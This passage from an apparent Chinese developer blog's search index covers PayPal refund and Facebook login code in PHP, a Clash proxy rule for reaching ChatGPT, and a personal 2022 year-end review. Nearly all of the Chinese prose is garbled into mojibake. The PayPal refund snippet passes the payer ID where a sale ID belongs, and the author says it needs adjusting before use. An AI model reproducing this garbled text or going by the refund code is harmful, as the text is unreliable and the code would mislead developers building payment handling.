è®¢å•å›è°ƒå¤„ç†å¼‚å¸¸ return false; &#125;&#125; é€€æ¬¾1234567891011121314151617181920212223// Paypal é€€æ¬¾public function refund($orderInfo)&#123; try &#123; $amount = new Amount(); $amount-&gt;setCurrency($this-&gt;currency) -&gt;setTotal($orderInfo['payment_amount']); $refundRequest = new RefundRequest(); $refundRequest-&gt;setAmount($amount); $sale = new Sale(); // ä»˜æ¬¾äºº ID $sale-&gt;setId($orderInfo['payer_id']); $result = $sale-&gt;refundSale($refundRequest, $this-&gt;apiContext); &#125; catch (\\Exception $e) &#123; // é€€æ¬¾å¤±è´¥ return $e-&gt;getMessage(); &#125; // é€€æ¬¾å®Œæˆ return true;&#125; é€€æ¬¾éœ€è¦ç”¨åˆ°ä»˜æ¬¾äºº IDï¼Œå¯ä»¥åœ¨æ”¯ä»˜å¼‚æ­¥å›è°ƒæ—¶ï¼Œä¿å­˜ä¸‹æ¥ã€‚ é€€æ¬¾è®°å½•ï¼š æ€»ç»“ä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œå¹¶ä¸èƒ½æ”¾åˆ°é¡¹ç›®ä¸­ä½¿ç”¨ï¼Œéœ€è¦è°ƒæ•´éƒ¨åˆ†å‚æ•°ã€‚ ä½¿ç”¨ PayPal çš„æ²™ç›’è´¦å·ï¼Œç™»å½•åˆ°Sandboxï¼Œå¯ä»¥çœ‹åˆ°äº¤æ˜“è®°å½•åŠé€€æ¬¾è®°å½•ï¼š å¦‚æœæœ‰å…¶ä»–æŠ€æœ¯é—®é¢˜ï¼Œå¯ä»¥æäº¤å·¥å•ã€‚ å‚è€ƒé“¾æ¥ PayPal Payment Api V1 Payment-&gt;execute gives error payer_id Value too long (Max len 20) PayPal PHP SDK Rest Api Developer Docs PayPal PHP SDK Docs æ‰‹åŠ¨å‘èµ· Webhooks é€šçŸ¥","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Facebook ç¬¬ä¸‰æ–¹ç™»å½•","slug":"facebook-third-party-login","date":"2023-03-06T09:32:42.000Z","updated":"2023-04-01T06:13:23.706Z","comments":true,"path":"facebook-third-party-login/","link":"","permalink":"https://www.0x2beace.com/facebook-third-party-login/","excerpt":"Facebook ç¬¬ä¸‰æ–¹ç™»å½•è®°å½•ã€‚","text":"Facebook ç¬¬ä¸‰æ–¹ç™»å½•è®°å½•ã€‚ å‡†å¤‡é¦–å…ˆæ³¨å†Œä¸€ä¸ª Facebook å¼€å‘è€…è´¦å·ã€‚ æˆåŠŸç™»å½•ä¹‹åï¼Œéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªåº”ç”¨ã€‚ æ­¤æ—¶éœ€è¦é€‰æ‹©ä¸€ä¸ªç±»å‹ï¼Œå› ä¸ºæ˜¯å¯¹æ¥ Facebook ç™»å½•ï¼Œå› æ­¤é€‰æ‹©ã€æ¶ˆè´¹è€…ã€ç±»å‹å°±å¥½äº†ã€‚ ç‚¹å‡»ä¸‹ä¸€æ­¥ç»§ç»­ï¼Œå¡«å†™å®ŒåŸºæœ¬ä¿¡æ¯ï¼Œç‚¹å‡»åˆ›å»ºåº”ç”¨å³å¯ã€‚ ä¸ºåº”ç”¨æ·»åŠ äº§å“ï¼Œé€‰æ‹© Facebook ç™»å½•ï¼š æ·»åŠ å®Œäº§å“ä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡Œ OAuth å®¢æˆ·ç«¯æˆæƒè®¾ç½®ï¼Œä¸»è¦æ˜¯è®¾ç½®æœ‰æ•ˆ OAuth è·³è½¬ URIã€‚ æ§åˆ¶é¢æ¿ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨ç¼–å·å’Œåº”ç”¨å¯†é’¥ï¼Œåé¢ä¼šç”¨åˆ°ã€‚ ç™»å½•æµç¨‹æ ¸å¿ƒé€»è¾‘å¦‚ä¸‹ï¼š ç”¨æˆ·ç‚¹å‡» Facebook ç™»å½•ï¼Œå®¢æˆ·ç«¯è·³è½¬ Facebook ç™»å½•æˆæƒ æˆæƒæˆåŠŸä¹‹åï¼Œæºå¸¦ code ä»¥åŠ stateï¼Œé‡å®šå‘å›ç™»å½•é¡µ å®¢æˆ·ç«¯æ ¹æ® code ä»¥åŠ stateï¼Œè¯·æ±‚ Facebook Apiï¼Œæ¢å–ä¸´æ—¶ accessToken å®¢æˆ·ç«¯å°† accessToken å‘é€ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è¯·æ±‚ Facebook Api è·å–ç”¨æˆ·ä¿¡æ¯ PHP æœåŠ¡ç«¯æ¥å…¥æœåŠ¡ç«¯æ¥å…¥ï¼Œå®‰è£… facebook sdkï¼š 1composer require facebook/graph-sdk ç™»å½• APIï¼š 1234567891011121314151617181920212223public function facebookLogin() &#123; // è·å–å®¢æˆ·ç«¯çš„AccessToken $accessToken = \"\"; $fb = new Facebook([ 'app_id' =&gt; Env::get('facebook.APP_ID'), 'app_secret' =&gt; Env::get('facebook.APP_SECRET'), 'default_graph_version' =&gt; 'v16.0', ]); // è®¾ç½®Access Token $fb-&gt;setDefaultAccessToken($accessToken); // ä»Facebook è·å–ç”¨æˆ·å¯¹è±¡ï¼Œå­—æ®µæŒ‰éœ€è·å– $response = $fb-&gt;get('/me?fields=name,email'); $fbUser = $response-&gt;getDecodedBody(); /** * fbUser * idï¼šYour Facebook UserID * nameï¼šYour Facebook Username * emailï¼šYour Facebook Email **/&#125; éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸º Facebook éœ€è¦ç§‘å­¦ä¸Šç½‘æ‰èƒ½è®¿é—®ï¼Œå¦‚æœæœ¬èº«åœ¨å¢™å†…ï¼Œé€šè¿‡ SDK è¯·æ±‚æ˜¯æ— æ³•è¯·æ±‚æˆåŠŸçš„ï¼Œä¼šå¾—åˆ°ä»¥ä¸‹é”™è¯¯ä¿¡æ¯ï¼š Connection timeout after 10000 ms æ­¤æ—¶æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š é€šè¿‡å¢ƒå¤–çš„æœåŠ¡å™¨è¿›è¡Œè°ƒè¯• æœ¬åœ°ç§‘å­¦ä¸Šç½‘çš„æƒ…å†µä¸‹ï¼Œæ›´æ”¹ Facebook SDK æºç ï¼Œvendor/facebook/graph-sdk/src/Facebook/HttpClients/FacebookCurlHttpClient.php 97 lineï¼Œå¢åŠ ï¼šCURLOPT_PROXY =&gt; &quot;Your local agent&quot; å‚è€ƒé“¾æ¥ Facebook ç™»å½•æ¦‚è§ˆ Graph Api å…¥é—¨æŒ‡å— åˆ©ç”¨ JavaScript SDK éƒ¨ç½²ç½‘é¡µç‰ˆ Facebook ç™»å½•","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"ChatGPT Access Denied","slug":"chatgpt-access-denied","date":"2023-02-18T03:44:20.000Z","updated":"2023-02-22T07:07:37.950Z","comments":true,"path":"chatgpt-access-denied/","link":"","permalink":"https://www.0x2beace.com/chatgpt-access-denied/","excerpt":"å› ä¸º openai å±è”½äº†å›½å†…è®¿é—®ï¼Œæ— è®ºæ˜¯ChatGPT è¿˜æ˜¯ChatGPT åº”ç”¨ï¼Œå°½ç®¡å¼€äº†å…¨å±€ä»£ç†ï¼Œç›´æ¥è®¿é—®è¿˜æ˜¯å¯èƒ½è®¿é—®ä¸äº†çš„ï¼Œä¼šé‡å®šå‘åˆ°ä¸‹é¢è¿™ä¸ªé¡µé¢ï¼š","text":"å› ä¸º openai å±è”½äº†å›½å†…è®¿é—®ï¼Œæ— è®ºæ˜¯ChatGPT è¿˜æ˜¯ChatGPT åº”ç”¨ï¼Œå°½ç®¡å¼€äº†å…¨å±€ä»£ç†ï¼Œç›´æ¥è®¿é—®è¿˜æ˜¯å¯èƒ½è®¿é—®ä¸äº†çš„ï¼Œä¼šé‡å®šå‘åˆ°ä¸‹é¢è¿™ä¸ªé¡µé¢ï¼š ç›®å‰å¹¶ä¸èƒ½é€šè¿‡åœ¨ ChatGPT åº”ç”¨ä¸­ï¼Œè®¾ç½®ä»£ç†çš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ ä¸è¿‡å€’æ˜¯å¯ä»¥é€šè¿‡æ›´æ–° Clash é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œèµ°è§„åˆ™ä»£ç†ã€‚ è§£å†³æ–¹æ¡ˆæ‰“å¼€ Clash é…ç½®æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°å½“å‰æ­£åœ¨ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œç¼–è¾‘å®ƒã€‚ æ–°å¢ä»¥ä¸‹è§„åˆ™ï¼š 12345678name: ğŸš€ ChatGPT type: select proxies: - ğŸ”°å›½å¤–æµé‡ - è¿™è¾¹æ˜¯å¯¹åº”çš„èŠ‚ç‚¹åˆ—è¡¨# é‡ç‚¹æ˜¯è¿™é‡Œï¼ŒåŠ ä¸Šè¿™ä¸ªåŸŸå- DOMAIN-SUFFIX,openai.com,ğŸš€ ChatGPT æ”¾åœ¨ä»»æ„ä¸€ä¸ªè§„åˆ™ä¸‹é¢å°±å¥½äº†ï¼š ç„¶åé‡è½½é…ç½®æ–‡ä»¶ã€‚ åˆ°è¿™ä¸€æ­¥åªæ˜¯å¢åŠ å¥½äº†è§„åˆ™ï¼Œä½¿ç”¨æ—¶éœ€è¦é€‰æ‹©å¯¹åº”è§„åˆ™ä¸‹é¢çš„èŠ‚ç‚¹ï¼Œä¸ç„¶ä¸ä¼šç”Ÿæ•ˆã€‚ ç¬¬ä¸€æ­¥ï¼Œå‡ºç«™æ¨¡å¼é€‰æ‹©å…¨å±€ä»£ç†ï¼ŒåŒæ—¶é€‰æ‹© DIRECT æ¨¡å¼ï¼š ç¬¬äºŒæ­¥ï¼Œæ‰¾åˆ°åˆšæ‰æ–°å¢çš„è§„åˆ™ï¼Œé€‰æ‹©è¯¥è§„åˆ™ä¸‹é¢çš„èŠ‚ç‚¹å³å¯ï¼š å†æ¬¡è®¿é—® ChatGPTï¼Œé¡µé¢æ­£å¸¸ã€‚ å‚è€ƒé“¾æ¥ ChatGPT å…³äºåœ¨ä¸­å›½åœ°åŒºä½¿ç”¨çš„é—®é¢˜æ±‡æ€»","categories":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/categories/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"ä¸€äº›ç»éªŒ","slug":"ä¸€äº›ç»éªŒ","permalink":"https://www.0x2beace.com/tags/%E4%B8%80%E4%BA%9B%E7%BB%8F%E9%AA%8C/"}]},{"title":"äºŒé›¶äºŒäºŒå¹´ç»ˆæ€»ç»“","slug":"2022-year-end-summary","date":"2023-01-01T11:50:21.000Z","updated":"2023-02-18T03:28:33.572Z","comments":true,"path":"2022-year-end-summary/","link":"","permalink":"https://www.0x2beace.com/2022-year-end-summary/","excerpt":"2022 æ€»ç®—æ˜¯æ¥è¿‘å°¾å£°äº†ï¼Œè¿™ä¸€å¹´å¤§å®¶éƒ½è¿‡å¾—ä¸å¤ªå¥½ï¼ŒåŒ…æ‹¬æˆ‘è‡ªå·±ï¼Œè¿™ä¸€å¹´å‘ç”Ÿäº†å¾ˆå¤šäº‹æƒ…ï¼Œæœ‰å¾—æœ‰å¤±ã€‚","text":"2022 æ€»ç®—æ˜¯æ¥è¿‘å°¾å£°äº†ï¼Œè¿™ä¸€å¹´å¤§å®¶éƒ½è¿‡å¾—ä¸å¤ªå¥½ï¼ŒåŒ…æ‹¬æˆ‘è‡ªå·±ï¼Œè¿™ä¸€å¹´å‘ç”Ÿäº†å¾ˆå¤šäº‹æƒ…ï¼Œæœ‰å¾—æœ‰å¤±ã€‚ ä»Šå¹´å¹´åˆç»™è‡ªå·±åˆ¶å®šäº†ä¸å°‘ç›®æ ‡ï¼Œå¹´åº•å›å¤´çœ‹çœ‹ï¼Œå¤§éƒ¨åˆ†å¤„äºå³å°†å®ŒæˆçŠ¶æ€ï¼š å¼€å§‹å­¦è‹±è¯­ æ¯å‘¨è‡³å°‘è·‘æ­¥ä¸¤æ¬¡ï¼Œæ¯æ¬¡è‡³å°‘äº”å…¬é‡Œ æ¯å‘¨è‡³å°‘äº”æ¬¡åœ¨é›¶ç‚¹ä¹‹å‰ä¸ŠåºŠç¡è§‰ æ¯å‘¨åšä¸€æ¬¡å¤ç›˜ åŠ¡å®è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»ŸåŸç†ã€æ•°æ®ç»“æ„åŠè®¡ç®—æœºç½‘ç»œåŸºç¡€ è‡³å°‘å®Œæˆä¸€ç™¾é“ LeetCode é¢˜ç›®ï¼Œå¹¶åšè§£é¢˜åˆ†æ æ¯å‘¨è‡³å°‘è¾“å‡ºä¸¤ç¯‡åšå®¢ æä¸€ä¸ªå‰¯ä¸š è„±å• ç»™å¦ˆå¦ˆæ¢ä¸€ä¸ªæ‰‹æœº ç¢ç¢å¿µè™½ç„¶ä»Šå¹´åœ¨å·¥ä½œä¸Šï¼Œå¯èƒ½ä¸æ€ä¹ˆé¡ºåˆ©ï¼Œä½†å¥½åœ¨è‡ªå·±çš„çŠ¶æ€å¹¶æ²¡æœ‰å—åˆ°å¤ªå¤§çš„å½±å“ï¼Œæ¯å¤©è¿‡å¾—è¿˜æ˜¯æŒºå……å®çš„ã€‚ æ—©ç¡æ—©èµ·ï¼Œä¸‰é¤ä¸è½ï¼ŒåšæŒè¿åŠ¨ã€‚ å‰ä¸¤å¤©ï¼Œkeep å‡ºäº†ä¸€ä¸ªå¹´åº¦è¿åŠ¨æŠ¥å‘Šï¼Œå½“çœ‹åˆ°é‚£äº›æ•°æ®æ—¶ï¼Œè¿˜æ˜¯æŒºå¼€å¿ƒçš„ï¼Œæ‰€æœ‰çš„æ±—éƒ½æ²¡æœ‰ç™½æµã€‚ å¹´åˆæ—¶ï¼Œæˆ‘çš„ä½“é‡æ˜¯ 65kgï¼Œç°åœ¨ï¼Œæˆ‘çš„ä½“é‡æ˜¯ 62kgï¼Œè™½ç„¶è¿™ä¸¤ä¸ªæ•°å­—å¹¶æ²¡æœ‰ç›¸å·®å¤šå°‘ï¼Œä½†æ˜¯æˆ‘æ˜æ˜¾èƒ½æ„Ÿå—åˆ°è‡ªå·±èº«ä½“çš„å˜åŒ–ã€‚ è„‚è‚ªå‡å°‘äº†ï¼Œè‚Œè‚‰å˜å¤šäº†ï¼Œæœ‰æ˜æ˜¾çš„çº¿æ¡äº†ï¼Œè¿™ä½¿å¾—è‡ªå·±ä¹Ÿæ›´è‡ªä¿¡äº†ã€‚ æ¯ä¸ªæœˆç»™è‡ªå·±æ‹ä¸€å¼ ç…§ï¼Œç­‰åˆ°å¹´åº•æ—¶ï¼Œå›å¤´çœ‹çœ‹è‡ªå·±è¿™ä¸€å¹´æ¥çš„å˜åŒ–ï¼Œå°±ä¼šæƒŠå¥‡åœ°å‘ç°å˜åŒ–è¿˜æŒºå¤§çš„ï¼Œä¹Ÿç®—æ˜¯ä¸€ä»¶æŒºæœ‰æ„æ€çš„äº‹æƒ…ã€‚ å­¦è‹±è¯­è¿™ä»¶äº‹æƒ…ï¼Œä»å‰å¹´å°±æœ‰äº†æƒ³æ³•ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰ä»˜å‡ºå®é™…è¡ŒåŠ¨ï¼ˆèƒŒå•è¯ä¸ç®—ï¼‰ï¼Œç›´åˆ°ä»Šå¹´æŠ¥åäº†ä¸€ä¸ªç³»ç»Ÿçš„è¯¾ç¨‹ã€‚ å› ä¸ºè¿™ä»¶äº‹å¹¶ä¸æ˜¯ä¸€æ—¶å…´èµ·ï¼Œå› æ­¤åŠ²å¤´è¿˜æ˜¯æŒºè¶³çš„ï¼ŒæœŸé—´è·Ÿç€å­¦ä¹ äº†åå¤šèŠ‚è¯¾ã€‚ åªæ˜¯åæ¥å› ä¸ºå·¥ä½œçš„äº‹æƒ…ï¼Œè¿›åº¦ç»™åœä¸‹äº†ã€‚ æˆ‘è¿™ä¸ªäººæœ‰ä¸ªä¸å¥½çš„æ¯›ç—…ï¼Œä»€ä¹ˆäº‹æƒ…ä¸€æ—¦åœä¸‹ï¼Œå°±å¾ˆéš¾å†æ¬¡æ¨åŠ¨ï¼Œå› æ­¤æ—¶å¸¸å‘Šè¯‰è‡ªå·±ï¼Œå¯ä»¥æ…¢ä¸€äº›ï¼Œä½†æ˜¯ä¸è¦åœä¸‹ã€‚ å…¶æ¬¡å°±æ˜¯è‡ªå·±è¿™ä¸€å¹´çš„èŒä¸šä¸Šçš„æ”¶è·äº†ï¼Œå› ä¸ºä¸‹åŠå¹´ç©ºé—´æ—¶é—´æ¯”è¾ƒå¤šï¼Œå¹´åˆçš„ç›®æ ‡æ˜¯æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å®Œæˆçš„ã€‚ è¿™ä¸€å¹´æŠŠè®¡ç®—æœºåŸºç¡€ç»™è¡¥äº†ä¸€ä¸‹ï¼Œåˆ·äº†è¿‘ 100 é“ç®—æ³•é¢˜ï¼Œç³»ç»Ÿå­¦ä¹ äº† Mysqlï¼Œä»¥åŠå…¥é—¨äº† Go è¯­è¨€ã€‚ å¯¹äºè¿™æ ·ä¸€ä¸ªç»“æœè¿˜æ˜¯æŒºæ»¡æ„çš„ã€‚ è‡³äºå‰¯ä¸šï¼Œæˆªè‡³ç›®å‰ï¼Œç¡®å®æ²¡æœ‰æ‰¾åˆ°ä»€ä¹ˆæ¯”è¾ƒå¥½çš„å‰¯ä¸šã€‚ å› ä¸ºå¯¹çƒ¹é¥ªè¿˜æŒºæ„Ÿå…´è¶£çš„ï¼Œæ˜å¹´æ‰“ç®—æ‹ä¸€äº›åšèœç›¸å…³çš„è§†é¢‘æ”¾åœ¨çŸ­è§†é¢‘å¹³å°ï¼Œæš‚æ—¶ä¸ç¡®å®šï¼Œèƒ½å¦å‘å±•æˆå‰¯ä¸šã€‚ å¤±ä»Šå¹´å¤±å»äº†å·¥ä½œï¼Œå¤±å»äº†å¯¹è±¡ï¼Œä¸¤è€…éƒ½æ˜¯æˆ‘ä¸»åŠ¨æå‡ºçš„ã€‚ å…«æœˆä»½æçš„ç¦»èŒï¼Œä¼‘æ¯äº†ä¸€ä¸ªæœˆï¼Œä¹‹åæ–­æ–­ç»­ç»­æ‰¾å·¥ä½œï¼Œä¸€ç›´åˆ°ç°åœ¨ã€‚ ç°åœ¨å†å›å¤´çœ‹çœ‹ï¼Œå¹¶æ²¡æœ‰å¤šåæ‚”ï¼Œåªæ˜¯è‡ªå·±åº”è¯¥æ›´ç†æ€§ä¸€äº›ï¼Œç–«æƒ…å½“ä¸‹ï¼Œè£¸è¾é£é™©å®åœ¨å¤ªå¤§äº†ã€‚ ä¹Ÿæ­£æ˜¯å…«æœˆä»½ä¼‘æ¯çš„é‚£ä¸€ä¸ªæœˆï¼Œå‘Šåˆ«äº†é•¿è¾¾äº”å¹´çš„å•èº«ï¼ŒåŒæ—¶æ²¡å¤šä¹…ï¼Œåˆå¼€å¯äº†å¼‚åœ°æ‹ã€‚ åˆšå¼€å§‹è¿˜å¥½ï¼Œå€Ÿç€çƒ­æ‹æœŸçš„ä¸€è‚¡åŠ²ï¼Œæ¯å¤©è¿˜èƒ½ä¿æŒäº¤æµï¼Œåé¢æˆ‘å› ä¸ºå·¥ä½œæ‰¾çš„ä¸é¡ºï¼Œå†…å¿ƒæ¯”è¾ƒå‹æŠ‘ï¼Œä¸¤ä¸ªäººäº¤æµè¶Šæ¥è¶Šå°‘ï¼Œä»¥è‡³äºæœ€åå‡ ä¹æ²¡æœ‰äº†äº¤æµã€‚ åäºŒæœˆï¼Œæˆ‘ä»”ç»†æƒ³äº†æƒ³ï¼Œè§‰å¾—ä¸èƒ½ç»§ç»­è¿™æ ·ä¸‹å»äº†ï¼Œæ—¢ç„¶å½¼æ­¤å·²ç»æ²¡æœ‰äº†æ„Ÿæƒ…ï¼Œå°±ä¸è¦è¿™æ ·å¼ºæ’‘ç€äº†ã€‚ äºæ˜¯ï¼Œåœ¨æŸå¤©è·Ÿå¥¹æäº†è¿™äº‹ï¼Œå¥¹ä¹Ÿå¾ˆå¹³é™ï¼Œå› æ­¤ï¼Œè¿™æ®µæ„Ÿæƒ…å°±è¿™æ ·ç»“æŸäº†ã€‚ è¿™ä¸¤ä»¶äº‹åœ¨ç°åœ¨çœ‹æ¥éƒ½ä¸ç®—åæ‚”ï¼Œåªæ˜¯å¦‚æœå½“åˆæ›´ç†æ™ºä¸€äº›ï¼Œç°åœ¨æ˜¯å¦æ˜¯å¦å¤–ä¸€ä¸ªç»“å±€ã€‚ å¾—è¿™ä¸€å¹´è‡ªå·±ä¹Ÿç¡®å®æ”¹å˜äº†ä¸å°‘ï¼Œæ— è®ºæ˜¯å†…åœ¨è¿˜æ˜¯å¤–åœ¨ã€‚ å›é¡¾è¿™ä¸€æ•´å¹´çš„ç»å†ï¼Œæœ‰ä»¥ä¸‹æ„Ÿæ‚Ÿï¼š 1. æ”¾å¼ƒå¹»æƒ³äººå¾€å¾€å¾ˆå®¹æ˜“çŠ¯çš„ä¸€ä¸ªé”™è¯¯å°±æ˜¯æŠŠå¸Œæœ›å¯„æ‰˜äºæœªæ¥ï¼Œå¯„æ‰˜äºæœªæ¥çš„è‡ªå·±ã€‚ 2. æŠŠé’±èŠ±åœ¨åˆ€åˆƒä¸Šä¹°ä¸œè¥¿ä¹‹å‰å¤šé—®è‡ªå·±å‡ ä¸ªé—®é¢˜ï¼Œæ˜¯å¦çœŸçš„éœ€è¦è¿™ä¸ªä¸œè¥¿ï¼Ÿæ˜¯å¦æœ‰æ›¿ä»£å“ï¼Ÿç°åœ¨ä¸ä¹°è¡Œä¸è¡Œï¼Ÿ åˆ«çœ‹å°ä»¶æ²¡æœ‰å¤šå°‘é’±ï¼Œæ•°é‡å¤šäº†ï¼Œä¹Ÿä¼šæ˜¯ä¸€ç¬”ä¸å°çš„å¼€é”€ã€‚ 3. ä¿æŒè¿åŠ¨åšæŒè¿åŠ¨ï¼Œä¸ä»…å¯ä»¥ä¿æŒè‰¯å¥½çš„ç²¾ç¥çŠ¶æ€ï¼Œè¿˜å¯ä»¥æ‹¥æœ‰ä¸€ä¸ªå¥åº·çš„èº«ä½“ã€‚ èº«ä½“æ‰æ˜¯é©å‘½çš„æœ¬é’±ï¼Œæ²¡æœ‰ä¸€ä¸ªå¥½çš„èº«ä½“ï¼Œåœ¨å…¶ä»–æ–¹é¢åšå¾—å†å¥½ï¼Œä¹Ÿæ— ç¦æ¶ˆå—ã€‚ ä»Šå¹´äº”æœˆä»½ï¼Œæˆ‘ç”Ÿè¿‡ä¸€åœºç—…ï¼Œè™½ä¸æ˜¯ä»€ä¹ˆå¤§ç—…ï¼Œä½†ä¹Ÿç€å®æŠŠæˆ‘æŠ˜ç£¨äº†ä¸€æ®µæ—¶é—´ã€‚ ä¸çŸ¥æ€ä¹ˆå°±æ‚£ä¸Šäº†çš®è‚¤ç—…â€”â€”ç«ç‘°ç³ ç–¹ï¼Œæœ€ä¸¥é‡çš„æ—¶å€™ï¼Œç®€ç›´ä¸å¿ç›´è§†ï¼Œé‚£äº›æ²¡æœ‰æš´éœ²åœ¨é˜³å…‰ä¹‹ä¸‹çš„çš®è‚¤ï¼Œå…¨éƒ¨é•¿æ»¡äº†ç–¹ã€‚ å¥½åœ¨æœ€ååº·å¤ä¹‹åï¼Œå¹¶æ²¡æœ‰ç•™ä¸‹ä»€ä¹ˆç–¤ã€‚ è¯´ä¸ªé¢˜å¤–è¯ï¼Œç›´åˆ° 2022 æœ€åä¸€å¤©ï¼Œæˆ‘è¿˜æ²¡æœ‰ğŸã€‚ 4. å¯¹æŠ—ç„¦è™‘å› ä¸ºå¯¹æœªæ¥çš„ä¸ç¡®å®šæ€§ï¼Œç„¦è™‘åœ¨æ‰€éš¾å…ï¼Œå­¦ä¼šå¦‚ä½•ç¼“è§£ç„¦è™‘ï¼Œè¿™ä¹Ÿç®—æ˜¯æˆ‘ä»Šå¹´çš„æ”¶è·ä¹‹ä¸€ï¼š ç¡çœ å¾ˆé‡è¦ ä¸è¦è¿‡åº¦åçœï¼Œå…è®¸è‡ªå·±é€‚å½“ä¼‘æ¯ è¿åŠ¨ä¸è¦åœï¼Œé€‰æ‹©ä¸€ä¸ªæ„Ÿå…´è¶£çš„è¿åŠ¨ï¼Œæ‰€æœ‰çš„æ±—æ°´éƒ½æµç»™å®ƒ è®¾ç½®å›ºå®šçš„ç„¦è™‘æ—¶é—´æ®µï¼Œæ¯å¤©åœ¨å›ºå®šçš„æ—¶é—´æ®µå»æƒ³å®ƒï¼Œè¿‡åå°±ä¸è¦å†æƒ³äº† æ‰¾åˆ°è‡ªå·±çš„èŠ‚å¥ï¼Œå¯ä»¥æ…¢ä¸€ç‚¹ï¼Œä½†ä¸è¦åœä¸‹ï¼Œä¹Ÿä¸è¦è¢«å…¶ä»–äººæ‰€å½±å“ å‡å°‘ä¸å¿…è¦çš„ç¤¾äº¤ è®©è‡ªå·±å¿™èµ·æ¥ï¼Œäººå¾€å¾€å°±æ˜¯å¤ªé—²äº†ï¼Œæ‰ä¼šæœ‰æ—¶é—´æƒ³ä¸œæƒ³è¥¿ 5. è‡ªä¿¡è¦è¯´ä»Šå¹´çš„è¿™æ®µæ„Ÿæƒ…ç»å†ï¼Œå¸¦ç»™æˆ‘äº†ä»€ä¹ˆï¼Œé‚£å°±æ˜¯å¥¹æ•™ä¼šäº†æˆ‘ï¼Œäººè¦è‡ªä¿¡ã€‚ å½“ç„¶ï¼Œä¹Ÿä¸æ˜¯è¯´è¦ç›²ç›®è‡ªä¿¡ï¼Œåªæ˜¯ä¸è¦è‡ªå‘ã€‚ ä¸è¦å› ä¸ºè‡ªå·±çš„èƒŒæ™¯ã€å­¦å†ã€å¤–è²Œæˆ–è€…å…¶ä»–ä»€ä¹ˆå› ç´ è€Œçœ‹ä¸èµ·è‡ªå·±ï¼ŒåŒæ—¶è‡ªå·±ä¹Ÿä¸è¦å› æ­¤çœ‹ä¸èµ·å…¶ä»–äººã€‚ æ€»ç»“ä»Šå¹´ä¸€å¹´è™½ç„¶åœ¨ç»æµä¸Šå¹¶æ²¡æœ‰å¤ªå¤šæ”¶å…¥ï¼Œä½†æ˜¯åœ¨å…¶ä»–æ–¹é¢ï¼Œè¿˜æ˜¯æ”¶è·æŒºå¤šï¼Œå¨è‰ºæœ‰äº†é•¿è¿›ã€èº«ä½“æ›´å¼ºå£®äº†â€¦ æ–°çš„ä¸€å¹´å³å°†åˆ°æ¥ï¼Œæ˜å¹´åˆšå¥½æ˜¯è‡ªå·±çš„æœ¬å‘½å¹´ï¼Œå‰æ®µæ—¶é—´ï¼Œè¿˜èŠ±äº†ä¸€ç‚¹é’±ï¼Œè¯·äººåœ¨æ³°å›½å¸®å¿™åšäº†ä¸€ä¸ªæ³•äº‹â€”â€”åŒ–å¤ªå²ï¼Œå›¾ä¸ªå‰åˆ©ã€‚ æ–°çš„ä¸€å¹´ï¼Œä¹Ÿä¸å¥¢æ±‚å¤§å¯Œå¤§è´µï¼Œå¹³å®‰å–œä¹å°±å¥½ã€‚ æœ€åç”¨äººæ°‘æ—¥æŠ¥çš„ä¸€æ®µè¯ï¼Œä½œä¸º 2022 çš„ç»“æŸè¯­ï¼š è¿‘å‡ å¹´å¤§ç¯å¢ƒä¸å¥½ï¼Œæœ‰äººç”Ÿæ„ä¸å¥½åšï¼Œæœ‰äººå¤±å»äº†å·¥ä½œï¼Œæœ‰äººæ¬ äº†å€ºï¼Œæœ‰äººç¦»æ•£ï¼Œå„æœ‰å„çš„éš¾ã€‚ä½†è¶Šæ˜¯ä¸é¡ºçš„æ—¶å€™ï¼Œè¶Šè¦æ²‰ä½æ°”ã€‚è‰°éš¾çš„è·¯ä¸æ˜¯è°éƒ½æœ‰èµ„æ ¼èµ°ï¼Œæ‰›å¾—ä½æ¶…ç—›ï¼Œæ‰é…å¾—ä¸Šé‡ç”Ÿä¹‹ç¾ã€‚å¦‚æœåœ¨ä¸€æ®µæ—¶é—´æš‚æ—¶èµšä¸åˆ°é’±ï¼Œä½ å¯ä»¥å¥èº«ï¼Œè¿åŠ¨ï¼Œå­¦ä¹ ï¼ŒæŠŠè‡ªå·±ç…§é¡¾å¥½ï¼Œå¤šé™ªä¼´å­©å­ï¼ŒæŠŠå­©å­æ•™è‚²å¥½ï¼Œå¤„ç†å¥½å®¶åº­å…³ç³»ï¼Œä½•å°ä¸æ˜¯ä¸€ç§æ”¶è·ã€‚æˆ‘ä»¬å¯ä»¥å…è®¸è‡ªå·±ä¸€æ—¶çš„ä¸é¡ºå’Œå¤±è´¥ï¼Œä½†å’±ä»¬åœ¨è·Œå€’çˆ¬èµ·æ¥çš„æ—¶å€™å«ç€å¾®ç¬‘ï¼Œä»æŒ«æŠ˜ä¸­é‡‡å›èƒœåˆ©çš„èŠ±æœµï¼Œæ˜¯ä¸€ä»¶å¾ˆé…·çš„äº‹æƒ…ã€‚äººç”Ÿæ˜¯ä¸€æ¡èºæ—‹ä¸Šå‡å¼çš„åŒºå¿ï¼Œè¦åŠªåŠ›ä½†ä¸è¦ç€æ€¥ï¼Œç¹èŠ±é”¦ç°‡ï¼Œç¡•æœç´¯ç´¯ï¼Œéƒ½éœ€è¦ä¸€ä¸ªè¿‡ç¨‹ã€‚","categories":[{"